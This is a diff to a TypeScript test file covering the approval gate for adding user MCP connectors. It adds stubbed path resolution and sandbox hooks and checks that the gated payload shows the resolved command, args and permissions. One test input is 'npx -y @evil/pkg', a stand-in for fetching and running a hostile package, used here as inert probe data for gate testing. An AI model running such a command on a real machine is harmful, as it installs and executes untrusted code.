@@ -59,7 +59,11 @@ function makeStubExecutor(gateResult: GateResult): {
 function baseOpts(extras: {
   toolExecutor?: ToolExecutor;
   syncScheduler?: { register: (s: { serviceId: string }) => void } | undefined;
-  connectorMesh?: { ensureUserMcpRunning: (id: string) => Promise<void> };
+  connectorMesh?: {
+    ensureUserMcpRunning: (id: string) => Promise<void>;
+    userMcpProtectedRoots?: () => readonly string[];
+    ensureUserMcpSandboxClean?: (id: string) => Promise<boolean>;
+  };
 }) {
   return {
     vault,
@@ -72,6 +76,22 @@ function baseOpts(extras: {
 }
 
 describe("dispatchConnectorRpc — addMcp gate", () => {
+  /** Fake PATH/filesystem: nothing real is consulted. Full resolution coverage: connector-rpc-addmcp.test.ts. */
+  const seams = {
+    // POSIX paths, so the platform is pinned to match on every host.
+    platform: "linux" as const,
+    resolveCommand: (c: string) => `/opt/bin/${c}`,
+    realpath: (p: string) => p,
+  };
+  const wired = () => ({
+    syncScheduler: { register: () => {} },
+    connectorMesh: {
+      ensureUserMcpRunning: async () => {},
+      userMcpProtectedRoots: () => [],
+      ensureUserMcpSandboxClean: async () => true,
+    },
+  });
+
   test("addMcp without toolExecutor -> -32603", async () => {
     try {
       await dispatchConnectorRpc({
@@ -89,20 +109,16 @@ describe("dispatchConnectorRpc — addMcp gate", () => {
   test("addMcp with rejected gate returns the gate result without dispatching", async () => {
     const { exec, calls } = makeStubExecutor({ status: "rejected", reason: "user declined" });
     const r = await dispatchConnectorRpc({
-      ...baseOpts({ toolExecutor: exec }),
+      ...baseOpts({ toolExecutor: exec, ...wired() }),
+      ...seams,
       method: "connector.addMcp",
       params: { serviceId: "mcp_blocked", commandLine: "echo hi" },
     });
     expect(r.kind).toBe("hit");
     if (r.kind !== "hit") return;
     expect(r.value).toEqual({ status: "rejected", reason: "user declined" });
-    expect(calls).toEqual([
-      {
-        type: "connector.addMcp",
-        // The owner must see WHICH command they are authorizing a spawn of.
-        payload: { serviceId: "mcp_blocked", commandLine: "echo hi" },
-      },
-    ]);
+    expect(calls).toHaveLength(1);
+    expect(calls[0]?.type).toBe("connector.addMcp");
     const row = db
       .query("SELECT service_id FROM user_mcp_connector WHERE service_id = ?")
       .get("mcp_blocked");
@@ -111,10 +127,9 @@ describe("dispatchConnectorRpc — addMcp gate", () => {
 
   test("addMcp with proceed dispatches to handleConnectorAddMcp", async () => {
     const { exec } = makeStubExecutor("proceed");
-    const scheduler = { register: () => {} };
-    const mesh = { ensureUserMcpRunning: async () => {} };
     const r = await dispatchConnectorRpc({
-      ...baseOpts({ toolExecutor: exec, syncScheduler: scheduler, connectorMesh: mesh }),
+      ...baseOpts({ toolExecutor: exec, ...wired() }),
+      ...seams,
       method: "connector.addMcp",
       params: { serviceId: "mcp_ok", commandLine: "echo hi" },
     });
@@ -123,19 +138,14 @@ describe("dispatchConnectorRpc — addMcp gate", () => {
     expect(r.value).toEqual({ ok: true, serviceId: "mcp_ok" });
   });
 
-  test("the gated payload names the same keys handleConnectorAddMcp consumes", async () => {
-    // The regression guard for #808. The handler reads `serviceId`/`commandLine`
-    // and derives command+args itself; the gate previously read `command`/`args`
-    // straight off the params, which are never sent — so every field was
-    // `undefined` and JSON.stringify dropped them, leaving `"payload":{}` in the
-    // prompt, the audit row and the egress ledger.
+  test("the gated payload names the resolved values the handler stores", async () => {
+    // The regression guard for #808: the gate once read `command`/`args` straight off the
+    // params, which are never sent, leaving `"payload":{}` in the prompt, the audit row and the
+    // egress ledger. The payload is now the resolved registration the handler writes.
     const { exec, calls } = makeStubExecutor("proceed");
     await dispatchConnectorRpc({
-      ...baseOpts({
-        toolExecutor: exec,
-        syncScheduler: { register: () => {} },
-        connectorMesh: { ensureUserMcpRunning: async () => {} },
-      }),
+      ...baseOpts({ toolExecutor: exec, ...wired() }),
+      ...seams,
       method: "connector.addMcp",
       params: { serviceId: "mcp_probe", commandLine: "npx -y @evil/pkg" },
     });
@@ -146,7 +156,11 @@ describe("dispatchConnectorRpc — addMcp gate", () => {
     // naive toEqual against `{}` but is exactly the bug.
     expect(JSON.parse(JSON.stringify(payload))).toEqual({
       serviceId: "mcp_probe",
-      commandLine: "npx -y @evil/pkg",
+      command: "/opt/bin/npx",
+      args: ["-y", "@evil/pkg"],
+      readPaths: ["/opt/bin"],
+      netHosts: [],
+      modelAccess: false,
     });
   });
 });
